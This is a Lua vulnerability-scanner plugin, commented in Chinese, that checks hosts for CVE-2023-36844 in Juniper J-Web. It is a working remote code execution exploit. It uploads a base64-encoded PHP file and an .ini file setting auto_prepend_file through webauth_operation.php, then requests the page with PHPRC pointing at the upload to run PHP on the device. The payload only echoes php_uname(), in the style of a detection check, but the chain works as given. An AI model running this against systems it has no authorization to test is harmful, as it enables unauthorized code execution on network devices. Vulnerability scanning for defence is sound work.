-- CVE-2023-36844 漏洞检测函数
local function check_CVE_2023_36844(target)
    -- 第一步: 尝试上传PHP文件
    local php_payload = "<?php echo('watchTowr:::'. php_uname() .':::rwoThctaw');?>"
    local php_payload_b64 = base64.encode(php_payload)
    
    local upload_url = target .. "/webauth_operation.php"
    local upload_data = {
        rs = "do_upload",
        ["rsargs[0]"] = string.format(
            '[{"fileData":"data:text/html;base64,%s","fileName":"watchTowr.php","csize":%d}]',
            php_payload_b64,
            #php_payload
        )
    }

    local headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded"
    }

    -- 发送请求
    local resp = http.post(upload_url, {
        headers = headers,
        data = upload_data,
        timeout = 5
    })

    if not resp or resp.status ~= 200 then
        return nil
    end

    -- 解析响应获取文件路径
    local php_path = string.match(resp.body, "0: '(.-)'}")
    if not php_path then
        return nil
    end

    -- 第二步: 上传 .ini 文件
    local ini_payload = string.format('auto_prepend_file="/var/tmp/%s"', php_path)
    local ini_payload_b64 = base64.encode(ini_payload)
    
    local ini_data = {
        rs = "do_upload",
        ["rsargs[0]"] = string.format(
            '[{"fileData":"data:plain/text;base64,%s","fileName":"watchTowr.ini","csize":%d}]',
            ini_payload_b64,
            #ini_payload
        )
    }

    resp = http.post(upload_url, {
        headers = headers,
        data = ini_data,
        timeout = 5
    })

    if not resp or resp.status ~= 200 then
        return nil
    end

    -- 解析响应获取ini文件路径
    local ini_path = string.match(resp.body, "0: '(.-)'}")
    if not ini_path then
        return nil
    end

    -- 第三步: 执行漏洞利用
    local exec_url = string.format("%s/webauth_operation.php?PHPRC=/var/tmp/%s", target, ini_path)
    resp = http.get(exec_url, { timeout = 5 })

    if resp and resp.status == 200 then
        local result = string.match(resp.body, "watchTowr:::(.-)::")
        if result then
            return {
                CVEID = "CVE-2023-36844",
                Severity = "critical",
                Type = "RCE",
                Extra = {
                    ["Command Output"] = result
                }
            }
        end
    end

    return nil
end


function Analyze(info)
 

    -- 构造目标URL
    local target = string.format("http://%s:%d", info.IP, info.Port)
    
    -- 检查各个CVE
    local vulns = {}
    
    -- 检查 CVE-2023-36844
    local result = check_CVE_2023_36844(target)
    if result then
        table.insert(vulns, result)
    end
    
    -- TODO: 添加其他CVE检查
    -- local result = check_CVE_XXXX_YYYY(target)
    -- if result then
    --     table.insert(vulns, result)
    -- end

    -- 如果发现漏洞，添加到结果中
    if #vulns > 0 then
        info.Vulnerabilities = vulns
    end

    return info
end
 